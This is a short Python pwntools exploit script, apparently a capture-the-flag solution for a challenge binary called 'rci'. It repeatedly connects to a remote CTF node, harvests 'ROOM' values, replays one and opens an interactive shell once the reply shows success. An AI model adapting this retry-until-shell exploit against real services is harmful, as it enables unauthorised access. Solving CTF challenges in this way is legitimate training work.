#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding: UTF-8 -*-
#Author: Square_R
#Time: 2021.02.03 10.40.04
#+++++++++++++++++++exp.py++++++++++++++++++++

from pwn import*
context.arch = 'amd64'


host = '1.1.1.1'
port = 10000
local = 1
if local:
	# context.log_level = 'debug'
	libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
	sh = process('./rci')
else:
	# context.log_level = 'debug'
	# libc=ELF('null')
	elf = ELF('./rci')
	

def getRoom(room):
	tmp = sh.recvuntil("R0OM#")
	room.append(tmp + sh.recv(10))
	sh.recvuntil('\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08')
counts = 0
def pwn():
	room = []
	sh.recvline()
	for i in range(0x30):
		getRoom(room)
	success("Time : " + str(counts))	
	print len(room)
	success("ROOM: " + str(room[4]))
	sh.sendline(room[4])
	sh.sendline(room[4])
	tmp = sh.recv()
	if 'shell' in tmp:
		success("shell")
	else:
		exit()
		


if __name__ == '__main__':
	while 1:
		try:
			sh = remote('node3.buuoj.cn',27825)
			pwn()
			sh.interactive()
		except:
			sh.close()
			counts += 1
